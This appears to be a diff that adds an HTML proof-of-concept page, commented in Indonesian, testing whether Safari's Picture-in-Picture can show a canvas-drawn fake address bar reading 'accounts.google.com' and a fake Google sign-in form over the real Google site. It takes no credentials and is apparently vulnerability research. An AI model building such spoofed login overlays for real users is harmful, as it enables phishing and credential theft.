@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC Safari - Google Login PiP + Button Origin Test</title>
+<style>
+  body{margin:0;background:#f1f3f4;color:#202124;font-family:-apple-system,Roboto,sans-serif;padding:12px;text-align:center}
+  .box{max-width:960px;margin:0 auto;background:#fff;border:1px solid #dadce0;border-radius:12px;overflow:hidden}
+  canvas{width:100%;display:block;cursor:pointer}
+  video{width:100%;display:none;border:2px solid #1a73e8;border-radius:12px;margin-top:8px;cursor:pointer}
+  button{font-size:15px;padding:14px 20px;margin:6px 0;width:100%;max-width:420px;border-radius:8px;border:none;font-weight:500;cursor:pointer}
+  .b1{background:#1a73e8;color:#fff}
+  .b2{background:#34a853;color:#fff}
+  .b3{background:#fbbc05;color:#000}
+  .b4{background:#ea4335;color:#fff}
+</style>
+</head>
+<body>
+
+<h3>Safari PiP - Fake Omnibox + Google Login</h3>
+<div class="box">
+  <canvas id="c" width="960" height="540"></canvas>
+  <video id="v" playsinline webkit-playsinline muted controls></video>
+</div>
+
+<button class="b1" id="btnInit">1. Init Video (tap wajib di iOS)</button>
+<button class="b2" id="btnPiP">2. Aktifkan PiP - Cek origin bonex1927.github.io muncul ga?</button>
+<button class="b3" id="btnGoogle">3. Buka google.com manual - cek PiP persist</button>
+<button class="b4" id="btnLogin">4. Klik Login (simulasi)</button>
+
+<script>
+var c=document.getElementById('c'), ctx=c.getContext('2d'), v=document.getElementById('v');
+var stream=null;
+
+function drawGoogleLogin(){
+  // Fake omnibox
+  ctx.fillStyle='#fff'; ctx.fillRect(0,0,960,56);
+  ctx.fillStyle='#5f6368'; ctx.font='14px sans-serif'; ctx.fillText('🔒',12,36);
+  ctx.fillStyle='#202124'; ctx.font='bold 14px sans-serif'; ctx.fillText('accounts.google.com',34,36);
+  
+  // Google logo + Sign in
+  ctx.textAlign='center';
+  ctx.fillStyle='#4285f4'; ctx.font='bold 24px sans-serif'; ctx.fillText('G',380,110);
+  ctx.fillStyle='#ea4335'; ctx.fillText('o',400,110);
+  ctx.fillStyle='#fbbc05'; ctx.fillText('o',418,110);
+  ctx.fillStyle='#4285f4'; ctx.fillText('g',436,110);
+  ctx.fillStyle='#34a853'; ctx.fillText('l',452,110);
+  ctx.fillStyle='#ea4335'; ctx.fillText('e',462,110);
+  ctx.fillStyle='#202124'; ctx.font='22px sans-serif'; ctx.fillText('Sign in',480,150);
+  
+  // Input + tombol Next di dalam PiP
+  ctx.textAlign='left';
+  ctx.strokeStyle='#1a73e8'; ctx.lineWidth=2; ctx.beginPath(); ctx.roundRect(260,200,440,48,4); ctx.stroke();
+  ctx.fillStyle='#202124'; ctx.font='16px sans-serif'; ctx.fillText('Email or phone',272,230);
+  ctx.fillStyle='#fff'; ctx.strokeStyle='#dadce0'; ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(260,270,440,48,4); ctx.fill(); ctx.stroke();
+  ctx.fillStyle='#5f6368'; ctx.fillText('Enter your password',272,300);
+  
+  // Tombol login di dalam canvas = yang keliatan di PiP
+  ctx.fillStyle='#1a73e8'; ctx.beginPath(); ctx.roundRect(520,340,180,36,4); ctx.fill();
+  ctx.fillStyle='#fff'; ctx.font='bold 14px sans-serif'; ctx.textAlign='center'; ctx.fillText('Next',610,363);
+  
+  requestAnimationFrame(drawGoogleLogin);
+}
+drawGoogleLogin();
+
+function init(){
+  if(c.captureStream) stream=c.captureStream(30);
+  else if(c.webkitCaptureStream) stream=c.webkitCaptureStream(30);
+  v.srcObject=stream; v.style.display='block'; c.style.display='none'; v.muted=true; v.play();
+}
+function goPiP(){
+  if(!stream) return;
+  if(v.webkitSetPresentationMode) v.webkitSetPresentationMode('picture-in-picture');
+  else if(v.requestPictureInPicture) v.requestPictureInPicture();
+}
+document.getElementById('btnInit').addEventListener('click', init);
+document.getElementById('btnPiP').addEventListener('click', goPiP);
+document.getElementById('btnGoogle').addEventListener('click', ()=>{ window.open('https://google.com','_blank'); });
+c.addEventListener('click', ()=>{ if(!stream) init(); setTimeout(goPiP,300); });
+</script>
+</body>
+</html>
